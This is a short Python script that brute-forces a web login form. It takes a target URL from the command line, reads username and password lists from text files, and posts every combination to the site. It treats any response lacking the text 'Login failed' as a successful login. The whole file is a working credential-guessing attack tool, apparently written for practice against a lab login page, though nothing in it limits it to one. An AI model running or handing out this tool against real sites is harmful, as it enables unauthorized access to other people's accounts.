import requests
import sys
import validators



#Using sys library to enter the url as an input
def get_url():
    url=sys.argv[1]

    if not validators.url(url):
        print("Invalid URL")
    return url

input=get_url()

#Reading the Username and Password Files
obj_username=open("Username.txt","r")
username=obj_username.read()
userlist=[line.strip() for line in open("Username.txt")]
obj_password=open("Password.txt","r")
password=obj_password.read()
passwordlist=[line.strip() for line in open("Password.txt")]

#boolean variable so that when we get the right combination the loop will break.
bol=False

for name in userlist:

    if not bol:
        for passwd in passwordlist:


            credentials={
            "username":name,
            "password":passwd,
            "Login":"Login"
            }

            req=requests.post (input , data = credentials) #creating post requests to send the target

            if req.text.find("Login failed") == -1: #If in the reply message "Login failed" is not present , those are the correct credentials
                print(f"[+] Correct username is {name} and Correct Password is {passwd}")
                bol=True
                break
            else:
                 print(f"[-] Login failed with {name} and {passwd} ")

    else:
        break